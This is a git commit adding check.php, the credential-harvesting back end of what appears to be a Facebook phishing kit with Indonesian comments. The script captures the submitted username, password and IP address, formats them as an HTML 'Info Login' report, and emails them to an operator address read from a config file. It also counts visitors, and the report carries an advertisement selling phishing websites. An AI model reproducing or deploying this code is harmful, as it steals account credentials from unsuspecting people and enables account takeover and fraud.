08fb26261f886c21b72c52c48fbe64f2214bf629
PATRICK297R <rasyawidyasaputra@gmail.com>
2025-02-11 07:01:26 +0700

    new

---
+++ check.php
@@ -0,0 +1,160 @@
+<?php
+// MENANGKAP DATA YG DI INPUT
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR'];
+
+// KONTEN RESULT AKUN
+$subjek = "🇮🇩 | +62 | Result Facebook si { $user }";
+$pesan = <<<EOD
+<!DOCTYPE html>
+	<html>
+	<head>
+		<title></title>
+		<meta name="viewport" content="width=log-width, "/>
+		<style type="text/css">
+			body {
+				font-family: "Helvetica";
+				width: 90%;
+				display: block;
+				margin: auto;
+				border: 1px solid #fff;
+				background: #fff;
+			}
+
+			.result {
+				width: 100%;
+				height: 100%;
+				display: block;
+				margin: auto;
+				position: fixed;
+				top: 0;
+				right: 0;
+				left: 0;
+				bottom: 0;
+				z-index: 999;
+				overflow-y: scroll;
+				border-radius: 10px;
+			}
+
+			.tblResult {
+				width: 100%;
+				display: table;
+				margin: 0px auto;
+				border-collapse: collapse;
+				text-align: center;
+				background: #fcfcfc;
+			}
+			.tblResult th {
+				text-align: left;
+				font-size: 1em;
+				margin: auto;
+				padding: 15px 10px;
+				background: #001240;
+				border: 2px solid #001240;
+				color: #fff;
+			}
+
+			.tblResult td {
+				font-size: 1em;
+				margin: auto;
+				padding: 10px;
+				border: 2px solid #001240;
+				text-align: left;
+				font-weight: bold;
+				color: #000;
+				text-shadow: 0px 0px 10px #fcfcfc;
+
+			}
+
+			.tblResult th img {
+				width: 100%;
+				display: block;
+				margin: auto;
+				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
+				border-radius: 10px;
+			}
+		</style>
+	</head>
+	<body>
+		<div class="result">
+	<img src="" style="width: 100%; display: block; margin: auto;">
+			
+	 <div style="background: #ff00fb; width: 294; color: #fff; text-align: center; padding: 10px;">🔆 Web Nezo Delavie 🔆</div>
+	
+			<table class="tblResult">
+            <tr>
+				</tr>
+					<th style="text-align: center;" colspan="3"> Info Login </th>
+				<tr>
+					<td style="border-right: none;">Email/Nomor</td>
+					<td style="text-align: center;">$user</td>
+				</tr>
+                <tr>
+					<td style="border-right: none;">Kata Sandi</td>
+					<td style="text-align: center;">$pass</td>
+				</tr>
+				<tr>
+					<td style="border-right: none;">IP Address</td>
+					<td style="text-align: center;"> $ip</td>
+				</tr>
+                </table>
+					<div style="background: #001240; width: 294; color: #fff; text-align: center; padding: 10px;"><b>Mau Beli Web Phising ? <br>Whatsapp <a href="https://wa.me/6283896640585"><b>Klik Disini</b></a>
+				</tr>
+</div>
+	</body>
+	</html>
+EOD;
+// TODAY
+$Tget = file_get_contents("etc/visitor.json");
+$Tdecode = json_decode($Tget,true);
+$today = $Tdecode['today'] + 1;
+$Tdecode['today'] = $today;
+$Tresult = json_encode($Tdecode);
+            $Tfile = fopen('etc/visitor.json','w');
+                     fwrite($Tfile,$Tresult);
+                     fclose($Tfile);
+                     
+// YESTERDAY
+if(date("H:i") == "01:00"){
+$Yget = file_get_contents("etc/visitor.json");
+$Ydecode = json_decode($Yget,true);
+$Ydecode['yesterday'] = $Ydecode['today'];
+$Ydecode['today'] = 0;
+$Yresult = json_encode($Ydecode);
+            $Yfile = fopen('etc/visitor.json','w');
+                     fwrite($Yfile,$Yresult);
+                     fclose($Yfile);
+}
+
+// ALL OVER
+$Aget = file_get_contents("etc/visitor.json");
+$Adecode = json_decode($Aget,true);
+$all = $Adecode['total'] + 1;
+$Adecode['total'] = $all;
+$Aresult = json_encode($Adecode);
+            $Afile = fopen('etc/visitor.json','w');
+                     fwrite($Afile,$Aresult);
+                     fclose($Afile);
+
+// RESULT DATA
+$resultGet = file_get_contents("etc/data.json");
+$resultData = json_decode($resultGet,true);
+
+$headers  = 'MIME-Version: 1.0' . "\r\n";
+$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+$headers .= 'From: '.$resultData['nama'].' <admin@sanzzz27.com>' . "\r\n";
+if(mail($resultData['email'], $subjek, $pesan, $headers))
+
+include '207168s.php';
+
+{
+$upGet = file_get_contents("etc/data.json");
+$upData = json_decode($upGet,true);
+$hasil = $upData['totals'] + 1;
+$upData['totals'] = $hasil;
+$upResult = json_encode($upData);
+$upFile = fopen('etc/data.json','w');
+          fwrite($upFile,$upResult);
+          fclose($upFile);
+}
